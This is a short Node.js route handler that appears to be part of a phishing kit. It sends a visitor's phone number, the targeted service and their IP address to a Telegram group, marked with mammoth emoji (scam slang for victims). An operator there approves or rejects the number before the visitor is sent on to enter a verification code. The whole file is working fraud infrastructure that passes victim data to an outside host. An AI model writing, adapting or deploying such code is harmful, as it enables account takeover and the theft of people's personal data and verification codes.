const { json } = require('body-parser');
const {bot, groupID} = require('../index');

const sendRequest = async (req, res) => {
    const {number, service} = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const keyboard = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
              [
                { text: 'Верно', callback_data: 'correct' },
                { text: 'Не верно', callback_data: 'incorrect' }
              ]
            ]
          }
      };
    bot.sendMessage(groupID,
`🦣 ${ip} 🦣

📱 Подтверждение номера 📱

🔄 Выберете действие 🔄

»»»       Сервис: ${service}       «««

»»»       ` +'`' + number + '`' + '       «««',
 keyboard);
 bot.once('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
  
    if (data === 'correct') {
        bot.sendMessage(groupID, `
🦣  ${ip}  🦣
✅Перенаправлен на код✅`);
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send({res: true});
    }
    if (data === 'incorrect') {
        bot.sendMessage(groupID, `
🦣  ${ip}  🦣
❌Сообщение о неверном номере❌`);
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send({res: false});
    }
});
}

module.exports = sendRequest

